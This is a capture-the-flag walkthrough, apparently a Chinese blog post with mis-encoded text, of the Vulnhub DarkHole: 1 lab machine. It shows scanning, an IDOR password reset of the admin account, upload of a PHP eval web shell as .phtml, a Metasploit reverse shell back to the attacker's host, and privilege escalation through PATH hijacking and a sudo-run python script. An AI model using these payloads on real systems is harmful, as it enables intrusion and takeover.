{"pageProps":{"postData":{"id":"VulnhubDarkHole 1","contentHtml":"<h1>DarkHole: 1</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/darkhole-1,724/\">https://www.vulnhub.com/entry/darkhole-1,724/</a></p>\n</blockquote>\n<h2>ç«¯å£æ‰«æä¸»æœºå‘ç°</h2>\n<ol>\n<li>\n<p>æ¢æµ‹å­˜æ´»ä¸»æœºï¼Œ<code>184</code>æ˜¯é¶æœº</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 09:59 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00016</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FE:CA:<span class=\"hljs-number\">7</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>æ¢æµ‹ä¸»æœºæ‰€æœ‰å¼€æ”¾ç«¯å£</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 09:59 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0011</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ä»¥åŠç³»ç»Ÿç‰ˆæœ¬</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-08 09:59 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.184</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0022</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu <span class=\"hljs-number\">4</span>ubuntu0.<span class=\"hljs-number\">2</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">41</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">4</span>.X|<span class=\"hljs-number\">5</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>æ‰«ææ¼æ´</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-08 <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">00</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00057</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-csrf: \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|       httponly flag not set\n|   /login.php: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\n| http-enum: \n|   /login.php: Possible admin folder\n|   /config/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|   /css/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|   /js/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\n|_  /upload/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.41 (ubuntu)'</span>\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">61</span>:C5:<span class=\"hljs-number\">52</span> (VMware)\n</code></pre>\n</li>\n</ol>\n<h2>webæ¸—é€</h2>\n<ol>\n<li>\n<p>è®¿é—®ä¸»é¡µï¼Œå­˜åœ¨ç™»å½•é¡µé¢é“¾æ¥</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image69.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>å…ˆæ‰«æç›®å½•çœ‹çœ‹</p>\n<pre><code class=\"hljs language-python\">dirsearch -u http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span> \n//\n[<span class=\"hljs-number\">10</span>:07:<span class=\"hljs-number\">48</span>] Starting:                                                                                                                                         \n[<span class=\"hljs-number\">10</span>:07:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">301</span> -  313B  - /js  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/js/                \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">301</span> -  317B  - /config  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/config/        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">10</span>] <span class=\"hljs-number\">200</span> -  460B  - /config/                                          \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">11</span>] <span class=\"hljs-number\">301</span> -  314B  - /css  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/css/              \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">12</span>] <span class=\"hljs-number\">200</span> -   21B  - /dashboard.php                                    \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">21</span>] <span class=\"hljs-number\">200</span> -  487B  - /js/                                              \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">200</span> -    1KB - /login.php                                        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">24</span>] <span class=\"hljs-number\">302</span> -    0B  - /logout.php  ->  login.php                        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">200</span> -    1KB - /register.php                                     \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">301</span> -  317B  - /upload  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/upload/        \n[<span class=\"hljs-number\">10</span>:08:<span class=\"hljs-number\">45</span>] <span class=\"hljs-number\">200</span> -  456B  - /upload/       \n</code></pre>\n<ul>\n<li><code>/dashboard.php</code>  æ— æƒé™</li>\n<li><code>/upload</code> ä¸Šä¼ æ–‡ä»¶å¤¹</li>\n<li><code>/config</code> å­˜åœ¨database.php</li>\n</ul>\n</li>\n<li>\n<p>ç™»é™†é¡µé¢å­˜åœ¨æ³¨å†Œï¼Œæˆ‘ä»¬æ³¨å†Œç”¨æˆ·<code>test</code>ç™»å½•</p>\n<p>è¿›å»åå‘ç°å¯ä»¥<code>update</code>ä¿¡æ¯ä»¥åŠæ›´æ”¹å¯†ç ï¼Œæ„Ÿè§‰ä¼šå­˜åœ¨æ³¨å…¥</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image70.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥</p>\n<ul>\n<li>\n<p><code>Details Update</code> éƒ¨åˆ†</p>\n<p>ä½¿ç”¨<code>sql</code>æµ‹è¯•æ²¡æ‰¾åˆ°æ³¨å…¥ç‚¹</p>\n</li>\n<li>\n<p><code>Password Change</code> éƒ¨åˆ†</p>\n<p>è¿™éƒ¨åˆ†æ²¡æ³¨å…¥â€¦.ä½†æ˜¯ä¿®æ”¹å¯†ç åŒºåŸŸå¯ä»¥æŠ“åŒ…å°†ä¼ å…¥çš„<code>id</code>å€¼ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶ä¿®æ”¹ä¸º<code>id=1</code>çš„ç”¨æˆ·ï¼ˆå¯èƒ½æ˜¯ç®¡ç†ç”¨æˆ·ï¼‰</p>\n<pre><code class=\"hljs language-python\">POST /dashboard.php?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">2</span> HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nUser-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">132.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">132.0</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span>\nAccept-Language: zh-CN,zh;q=<span class=\"hljs-number\">0.8</span>,zh-TW;q=<span class=\"hljs-number\">0.7</span>,zh-HK;q=<span class=\"hljs-number\">0.5</span>,en-US;q=<span class=\"hljs-number\">0.3</span>,en;q=<span class=\"hljs-number\">0.2</span>\nAccept-Encoding: gzip, deflate, br\nContent-<span class=\"hljs-type\">Type</span>: application/x-www-form-urlencoded\nContent-Length: <span class=\"hljs-number\">20</span>\nOrigin: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\nSec-GPC: <span class=\"hljs-number\">1</span>\nConnection: keep-alive\nReferer: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>/dashboard.php?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">2</span>\nCookie: PHPSESSID=aal4svnq3poomufcq5sv2lo2fu\nUpgrade-Insecure-Requests: <span class=\"hljs-number\">1</span>\nPriority: u=<span class=\"hljs-number\">0</span>, i\n\npassword=<span class=\"hljs-number\">123456</span>&#x26;<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span>\n</code></pre>\n<p>æˆåŠŸå°†åŒ…å‘é€ï¼Œæç¤º<code>Password has been change</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>ç™»é™†åå°ï¼Œç”¨æˆ·åä½¿ç”¨<code>admin</code> ï¼Œå¯†ç æ˜¯ç”¨ä¿®æ”¹åçš„<code>123456</code> ï¼ŒæˆåŠŸè¿›å…¥</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image71.png\" alt=\"image.png\"></p>\n<p>å¤šäº†ä¸ªä¸Šä¼ æ–‡ä»¶æ¡†</p>\n</li>\n<li>\n<p>å°è¯•æ–‡ä»¶ä¸Šä¼ ä¸Šä¼ ğŸ</p>\n<ul>\n<li>\n<p>ç›´æ¥ä¸Šä¼ <code>2.php</code> ï¼Œå†…å®¹æ˜¯ä¸€å¥é©¬ï¼Œæç¤ºï¼š<code>Sorry , Allow Ex : jpg,png,gif</code> çœ‹ç€åƒæ˜¯ç™½åå•</p>\n</li>\n<li>\n<p>å°è¯•äº†ä¸€ä¸‹ï¼Œä¸åªæ˜¯å¯ä»¥ä¸Šä¼ <code>jpg,png,gif</code> ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ åˆ«çš„åç¼€æ–‡ä»¶ï¼Œæ‰€ä»¥æ›´åƒæ˜¯æŠŠ<code>php</code>ç±»çš„æ–‡ä»¶åç¼€æ”¾è¿›é»‘åå•äº†</p>\n</li>\n<li>\n<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€äº›æ–‡ä»¶ä¸Šä¼ <code>CTF</code>çš„å¥—è·¯ï¼Œæˆ‘ä»¬å°†<code>php</code>æ”¹ä¸ºå…¶ä»–å¯ä»¥è§£é‡Šä¸º<code>php</code>æ–‡ä»¶çš„åç¼€ï¼Œæˆ‘å°†å…¶ä¿®æ”¹ä¸º<code>phtml</code> ï¼Œä¸Šä¼ æˆåŠŸï¼ˆæˆ‘æ˜¯æŠ“åŒ…åä¿®æ”¹çš„ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹æ–‡ä»¶åç¼€ç„¶åç›´æ¥ä¸Šä¼ ï¼‰</p>\n<pre><code class=\"hljs language-python\">Content-Disposition: form-data; name=<span class=\"hljs-string\">\"fileToUpload\"</span>; filename=<span class=\"hljs-string\">\"2.phtml\"</span>\nContent-<span class=\"hljs-type\">Type</span>: application/octet-stream\n\n&#x3C;?php @<span class=\"hljs-built_in\">eval</span>($_POST[x]); ?>\n</code></pre>\n</li>\n<li>\n<p>ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨äº†<code>/upload</code>è·¯å¾„ï¼Œæµ‹è¯•èƒ½å¦ä½¿ç”¨</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image72.png\" alt=\"image.png\"></p>\n<p>å¯ä»¥æ­£å¸¸åŒ…å«</p>\n</li>\n</ul>\n</li>\n<li>\n<p>ä½¿ç”¨èšğŸ—¡è¿æ¥</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image73.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h2>ææƒ</h2>\n<ol>\n<li>\n<p>æˆ‘ä»¬å…ˆåå¼¹<code>shell</code> ï¼Œé¶æœºè‡ªå¸¦çš„<code>nc</code>ä¸æ”¯æŒ<code>-e</code> ,æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸Šä¼ åå¼¹<code>shell</code>è„šæœ¬ç„¶ååŒ…å«</p>\n<ul>\n<li>\n<p>ç”Ÿæˆè„šæœ¬</p>\n<pre><code class=\"hljs language-python\">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> lport=<span class=\"hljs-number\">1234</span> -f raw > getshell.php\n[-] No platform was selected, choosing Msf::Module::Platform::PHP <span class=\"hljs-keyword\">from</span> the payload\n[-] No arch selected, selecting arch: php <span class=\"hljs-keyword\">from</span> the payload\nNo encoder specified, outputting raw payload\nPayload size: <span class=\"hljs-number\">1115</span> <span class=\"hljs-built_in\">bytes</span>\n</code></pre>\n</li>\n<li>\n<p>åœ¨èšğŸ—¡å°†è„šæœ¬ä¸Šä¼ <code>upload</code>æ–‡ä»¶å¤¹é‡Œ</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image74.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p><code>kali</code>æ‰“å¼€<code>msf</code>ç›‘å¬</p>\n<pre><code class=\"hljs language-python\">msf6 > use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> payload php/meterpreter/reverse_tcp\npayload => php/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>\nlhost => <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>\nmsf6 exploit(multi/handler) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">1234</span>\nlport => <span class=\"hljs-number\">1234</span>\nmsf6 exploit(multi/handler) > run\n</code></pre>\n</li>\n<li>\n<p>ç½‘é¡µè®¿é—®ä¸Šä¼ çš„è„šæœ¬æ–‡ä»¶</p>\n<p><img src=\"/post-images/VulnhubDarkHole%201/image75.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>è·å¾—<code>shell</code></p>\n<pre><code class=\"hljs language-python\">[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> \n[*] Sending stage (<span class=\"hljs-number\">39927</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>\n[*] Meterpreter session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">1234</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.184</span>:<span class=\"hljs-number\">55480</span>) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-08 <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">49</span>:08 +0800\n\nmeterpreter > \n</code></pre>\n<p>è¾“å…¥shellè·å¾—shellå‘½ä»¤è¡Œ</p>\n</li>\n</ul>\n</li>\n<li>\n<p>æŸ¥çœ‹æƒé™</p>\n<pre><code class=\"hljs language-python\">$ whoami\nwww-data\n$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n$ uname -a\nLinux darkhole <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">77</span>-generic <span class=\"hljs-comment\">#86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>å¯»æ‰¾åˆ©ç”¨ç‚¹</p>\n<ul>\n<li>\n<p>SUIDæƒé™</p>\n<pre><code class=\"hljs language-python\">$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-<span class=\"hljs-number\">1</span>/polkit-agent-helper-<span class=\"hljs-number\">1</span>\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/<span class=\"hljs-built_in\">bin</span>/su\n/usr/<span class=\"hljs-built_in\">bin</span>/at\n/usr/<span class=\"hljs-built_in\">bin</span>/umount\n/usr/<span class=\"hljs-built_in\">bin</span>/pkexec\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/fusermount\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/<span class=\"hljs-built_in\">bin</span>/mount\n/home/john/toto\n</code></pre>\n<p><code>/home/john/toto</code> è¿™ä¸ªä¸€çœ‹å°±ä¸å¯¹åŠ²</p>\n</li>\n<li>\n<p>æ•°æ®åº“é…ç½®æ–‡ä»¶</p>\n<pre><code class=\"hljs language-python\">$ cat database.php\n&#x3C;?php\n$connect = new mysqli(<span class=\"hljs-string\">\"localhost\"</span>,<span class=\"hljs-string\">'john'</span>,<span class=\"hljs-string\">'john'</span>,<span class=\"hljs-string\">'darkhole'</span>);\n</code></pre>\n<p>å¯ä»¥å°è¯•å¯†ç ç¢°æ’<code>ssh</code>ï¼Œä½†æ˜¯å¯†ç é”™è¯¯</p>\n</li>\n</ul>\n</li>\n<li>\n<p>æ¥åˆ°<code>/home/john/</code> ï¼Œä¸‹æœ‰å››ä¸ªæ–‡ä»¶</p>\n<pre><code class=\"hljs language-python\">$ ls\nfile.py\npassword\ntoto\nuser.txt\n</code></pre>\n<p>ä½†æ˜¯é™¤äº†<code>toto</code>æœ‰è¯»å’Œæ‰§è¡Œæƒé™ï¼Œåˆ«çš„éƒ½æ²¡æœ‰æƒé™ï¼Œå‰é¢<code>suid</code>ä¹Ÿæœç´¢å‡ºäº†<code>toto</code> ï¼Œå°è¯•åˆ©ç”¨</p>\n</li>\n<li>\n<p>åˆ©ç”¨<code>toto</code></p>\n<ul>\n<li>\n<p>å› ä¸ºä¸çŸ¥é“æœ‰ä»€ä¹ˆä½œç”¨ï¼Œæˆ‘ä»¬ç›´æ¥æ‰§è¡Œ</p>\n<pre><code class=\"hljs language-python\">$ ./toto\nuid=<span class=\"hljs-number\">1001</span>(john) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n</code></pre>\n</li>\n<li>\n<p>æˆ‘ä»¬é€šè¿‡èšğŸ—¡ä¸‹è½½è¯¥æ–‡ä»¶ä¸‹æ¥ï¼Œä½¿ç”¨<code>IDA</code>åç¼–è¯‘çœ‹çœ‹å†™äº†å•¥</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-built_in\">int</span> __fastcall main(<span class=\"hljs-built_in\">int</span> argc, const char **argv, const char **envp)\n{\n  setuid(0x3E9u);\n  setgid(0x3E9u);\n  <span class=\"hljs-keyword\">return</span> system(<span class=\"hljs-string\">\"id\"</span>);\n}\n</code></pre>\n<p>è®¾ç½®<code>UID</code>ç„¶åè®¾ç½®<code>GID</code>æœ€åè¾“å‡º<code>ID</code>å‘½ä»¤</p>\n</li>\n<li>\n<p>åŠ«æŒç¯å¢ƒå˜é‡</p>\n<p>å› ä¸ºä»–ä¼šæ‰§è¡Œ<code>id</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹ç¯å¢ƒå˜é‡è®©ä»–æ‰§è¡Œidçš„æ—¶å€™æ‰§è¡Œ<code>/bin/bash</code></p>\n<pre><code class=\"hljs language-python\">$ echo <span class=\"hljs-string\">\"/bin/bash\"</span> > /tmp/<span class=\"hljs-built_in\">id</span>\n$ chmod <span class=\"hljs-number\">777</span> /tmp/<span class=\"hljs-built_in\">id</span>\n$ export PATH=/tmp:$PATH \n</code></pre>\n<p><code>$ export PATH=/tmp:PATH</code>  è®¾ç½®<code>/tmp</code>ä¸ºç¯å¢ƒå˜é‡çš„å¼€å¤´ï¼Œé‚£æ ·å°±å¯ä»¥ä¸€å¼€å§‹å°±å»<code>/tmp</code>å¯»æ‰¾ <code>id</code> ä¹Ÿå°±æ˜¯<code>/bin/bash</code></p>\n<p>æ‰§è¡Œ<code>toto</code> ï¼Œè·å¾—<code>john</code>çš„shell</p>\n<pre><code class=\"hljs language-python\">$ ./toto\njohn@darkhole:/home/john$\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>è·å¾—<code>john</code>çš„ç”¨æˆ·åæŸ¥çœ‹ä¹‹å‰æ²¡æƒé™çœ‹çš„æ–‡ä»¶</p>\n<ul>\n<li>\n<p><code>password</code> æ˜¯<code>john</code>çš„å¯†ç ï¼Œæˆ‘ä»¬ç”¨å®ƒå»<code>ssh</code>ç™»å½•<code>john</code>è·å¾—æ›´å¥½çš„ç”¨æˆ·äº¤äº’<code>shell</code></p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ cat password \nroot123\n</code></pre>\n</li>\n<li>\n<p><code>file.py</code>æ˜¯ç©ºçš„</p>\n<pre><code class=\"hljs language-python\">ohn@darkhole:~$ cat file.py \n\n</code></pre>\n</li>\n<li>\n<p><code>user.txt</code> ä¸€ä¸ª<code>flag</code></p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ cat user.txt \nDarkHole{You_Can_DO_It}\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>å¯»æ‰¾åˆ©ç”¨ç‚¹</p>\n<ul>\n<li>\n<p>æŸ¥çœ‹<code>sudo</code>æƒé™</p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ sudo -l\n[sudo] password <span class=\"hljs-keyword\">for</span> john: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> john on darkhole:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>\n\nUser john may run the following commands on darkhole:\n    (root) /usr/<span class=\"hljs-built_in\">bin</span>/python3 /home/john/file.py\n</code></pre>\n<p>å¯ä»¥ä½¿ç”¨<code>root</code>æƒé™æ‰§è¡Œ<code>file.py</code>æ–‡ä»¶ï¼Œå“¦è±ï¼Œå¯ä»¥ææƒäº†</p>\n</li>\n<li>\n<p>ç¼–è¾‘<code>file.py</code>æ–‡ä»¶ï¼Œå°†ææƒè¯­å¥å†™å…¥<code>file.py</code></p>\n<pre><code class=\"hljs language-python\">ehco <span class=\"hljs-string\">\"import os;os.system('/bin/bash');\"</span> >> file.py\n</code></pre>\n</li>\n<li>\n<p>ä½¿ç”¨<code>sudo</code>æƒé™æ‰§è¡Œ</p>\n<pre><code class=\"hljs language-python\">john@darkhole:~$ sudo /usr/<span class=\"hljs-built_in\">bin</span>/python3 /home/john/file.py \nroot@darkhole:\n</code></pre>\n<p>è·å¾—rootï¼ï¼ï¼</p>\n</li>\n</ul>\n</li>\n<li>\n<p>è¯»å–<code>flag</code>æ–‡ä»¶</p>\n<pre><code class=\"hljs language-python\">root@darkhole:~<span class=\"hljs-comment\"># cat root.txt </span>\nDarkHole{You_Are_Legend}\n</code></pre>\n</li>\n</ol>","title":"Vulnhub - DarkHole 